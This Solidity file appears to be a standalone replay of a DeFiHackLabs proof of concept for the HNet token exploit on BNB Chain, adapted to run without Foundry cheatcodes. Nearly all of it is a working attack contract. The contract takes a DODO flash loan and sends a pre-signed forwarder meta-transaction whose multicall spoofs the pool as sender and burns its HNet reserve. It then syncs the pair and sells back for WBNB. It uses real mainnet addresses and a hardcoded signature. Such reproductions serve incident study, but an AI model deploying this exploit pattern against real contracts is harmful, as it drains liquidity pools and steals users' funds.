// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// HNet_exp.sol test's testExploit()/DPPFlashLoanCall() logic verbatim, but
// without inheriting forge-std Test (which depends on the Foundry cheatcode
// contract having code at 0x7109...; that address has no code in a plain EVM
// replay, so any cheatcode call reverts before the real attack logic runs).
//
// The original test signs an EIP-712 GSNv2 `ForwardRequest` at runtime with
// `vm.sign(attackerPk, digest)` (attackerPk = 0xA11CE). `vm.sign` is the ONLY
// piece that has no plain-Solidity equivalent (ECDSA signing needs the raw
// private key, not just its derived address), so the signature is
// precomputed OFFLINE and hardcoded below. Everything else the signature
// depends on — `Forwarder.getNonce(attacker)` and
// `HNetToken.balanceOf(address(Pair)) - 1` (the burn amount, read AFTER the
// WBNBTOTOKEN() swap shifts the pool's reserves, exactly like the original
// test) — is a plain view/external call and is kept LIVE below, so it is
// computed at replay time exactly like the original. Because the replay is
// deterministic (frozen fork state + fixed call sequence), those live reads
// reproduce the exact values used for the offline signature: nonce = 0
// (fresh EOA) and amountToBurn = 18310237227975690664288044352357 (verified
// against a local `forge test -vvvv` trace against the dumped anvil state).
// The EIP-712 digest and its ECDSA signature were computed OFFLINE (cast
// keccak / cast abi-encode / cast wallet sign --no-hash, verified to recover
// 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7) and hardcoded below as
// constants — the replayed contract submits the already-signed
// meta-transaction, exactly as the original test's tx did on-chain.
//
// Plain Solidity: no Test, no cheats, no setUp. Entry is testExploit().

// @KeyInfo - Total Lost : ~2.4 $WBNB
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0xaed80b8a821607981e5e58b7a753a3336c0bfd6f
// Vulnerable Contract : https://bscscan.com/address/0x0dabdc92af35615443412a336344c591faed3f90
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x1ee617cd739b1afcc673a180e60b9a32ad3ba856226a68e8748d58fcccc877a8

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IPancakeRouter {
    // NOTE: this variant returns nothing on-chain (verified against the
    // registry's interface.sol) — declaring a `returns (uint256[] memory)`
    // here would make Solidity try to ABI-decode a return value from the
    // empty returndata and revert immediately after a successful call.
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IHNetTOWBNB {
    function sync() external;
}

interface IForwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }

    function execute(ForwardRequest memory req, bytes memory signature) external payable returns (bool, bytes memory);
    function getNonce(
        address from
    ) external view returns (uint256);
}

interface IHNet is IERC20 {
    function burn(
        uint256 amount
    ) external;
    function multicall(
        bytes[] memory data
    ) external returns (bytes[] memory results);
}

contract HNet {
    IHNet HNetToken = IHNet(0x256D3BC542Ff4eDb5959b584Cc98741d28165BBc);
    IForwarder Forwarder = IForwarder(0x7C4717039B89d5859c4Fbb85EDB19A6E2ce61171);
    IHNetTOWBNB Pair = IHNetTOWBNB(0x7E3F53Af12B2C84c35700BE68Cd316518546ca34);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter Router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPAdvanced DODO = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);

    // The meta-tx relayer / signer (test constant `attackerPk = 0xA11CE`).
    // The MinimalForwarder.verify() requires recovered signer == req.from, so
    // the request below is signed with that key (offline, see file header).
    // The burn TARGET is the spoofed _msgSender() (= address(Pair)) baked into
    // the multicall payload, NOT this `attacker` address, so any nonce-0 EOA
    // works here.
    address constant attacker = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;

    // Precomputed EIP-712 signature over the ForwardRequest built in
    // DPPFlashLoanCall below (see file header for the exact offline
    // derivation: nonce = 0, amountToBurn = HNet.balanceOf(Pair) - 1 AFTER
    // the WBNBTOTOKEN() swap = 18310237227975690664288044352357).
    bytes32 constant sigR = 0x798a31c1d64d43a8869ab3a576c975491f3485b89048f62bb94f2a46687611c6;
    bytes32 constant sigS = 0x5e0f5259426c30516637ed1480b507e5211a186414e0751696c80425718cff8a;
    uint8 constant sigV = 0x1b;

    function testExploit() external {
        HNetToken.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        DODO.flashLoan(0.1 * 1e18, 0, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        require(msg.sender == address(DODO), "Fail");
        WBNBTOTOKEN();

        // Burn (almost) the ENTIRE HNet balance of the pool by spoofing
        // _msgSender() to be the pool itself. Crashing the pool's HNet
        // reserve collapses the HNet price; after sync() we sell our HNet
        // back for a large amount of WBNB.
        uint256 amountToBurn = HNetToken.balanceOf(address(Pair)) - 1;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodePacked(IHNet.burn.selector, amountToBurn, address(Pair));
        bytes memory data_muliti = abi.encodeWithSelector(IHNet.multicall.selector, datas);

        IForwarder.ForwardRequest memory req = IForwarder.ForwardRequest({
            from: attacker,
            to: address(HNetToken),
            value: 0,
            gas: 5e6,
            nonce: Forwarder.getNonce(attacker),
            data: data_muliti
        });

        bytes memory signature = abi.encodePacked(sigR, sigS, sigV);

        Forwarder.execute(req, signature);
        Pair.sync();
        TOKENTOWBNB();

        WBNB.transfer(address(DODO), 0.1 * 1e18);
    }

    function WBNBTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HNetToken);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.1 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HNetToken);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HNetToken.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
